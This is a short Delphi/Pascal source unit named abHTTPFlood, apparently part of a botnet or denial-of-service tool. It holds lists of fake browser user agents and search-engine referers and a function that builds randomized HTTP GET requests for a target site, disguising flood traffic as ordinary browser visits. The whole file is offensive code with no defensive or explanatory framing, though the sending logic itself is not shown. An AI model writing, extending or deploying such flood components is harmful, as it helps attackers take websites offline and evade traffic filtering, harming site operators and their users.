unit abHTTPFlood;

interface
  uses Windows, abWinsock;

const
  UserAgents: array[1..11] of String = (
  'Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.0)',
  'Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.1)',
  'Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.2)',
  'Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0)',
  'Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.1)',
  'Opera/7.51 (Windows NT 5.0; U) [en]',
  'Opera/7.51 (Windows NT 5.1; U) [en]',
  'Opera/7.51 (Windows NT 5.2; U) [en]',
  'Opera/7.51 (Windows NT 6.0; U) [en]',
  'Opera/7.51 (Windows NT 6.1; U) [en]',
  'Opera/7.50 (Windows XP; U)');

  Referer: array[1..5] of String = (
  'http://www.google.com/',
  'http://www.yahoo.com/',
  'http://www.ask.com/',
  'http://www.alexa.com/',
  'http://www.live.com/');

function CreateHTTPRequest(Site: String): String;

implementation

function CreateHTTPRequest(Site: String): String;
var
  Request: String;
begin
  Randomize;
	Request := 'GET ' + Site + ' HTTP/1.1' + #13#10;
  Request := Request + 'Host: ' + Site + #13#10;
  Request := Request + 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' + #13#10;
  Request := Request + 'Accept-Language: en-us,en' + #13#10;
  Request := Request + 'User-Agent: ' + UserAgents[1 + Random(11)] + #13#10;
  Request := Request + 'Referer: ' + Referer[1 + Random(5)] + #13#10;
  Request := Request + 'Connection: close' + #13#10#13#10;
  Result := Request;
end;

end.

